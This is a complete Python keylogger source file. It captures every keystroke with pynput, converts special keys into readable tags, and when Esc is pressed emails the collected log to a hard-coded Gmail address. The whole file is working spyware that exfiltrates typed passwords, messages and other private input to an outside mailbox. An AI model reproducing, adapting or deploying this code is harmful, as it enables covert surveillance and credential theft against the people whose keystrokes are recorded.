from pynput.keyboard import Listener, Key
from sendEmail import send_email

count = 0
keys = []
logged_data = []
substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
    'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
    'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
    '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
    '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

def on_press(key):
    global keys, count
    print(key)
    keys.append(str(key))
    count +=1 
    if count >= 1:
        count = 0
        write_email(keys)
        keys = []
    
def write_email(keys):
    for key in keys:
        k = key.replace("'","")
        if key in substitution:
            k = (substitution[substitution.index(key)+1])
        logged_data.append(k)
    
def on_release(key):
    if key == Key.esc:
        return False

if __name__=='__main__':
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    message= ""
    for l in logged_data:
        log = l.replace("'","")
        message+=log
    
    subject = "logged data"
    body = message
    to_email = 'test.keylogger34@gmail.com'
    send_email(subject, body, to_email)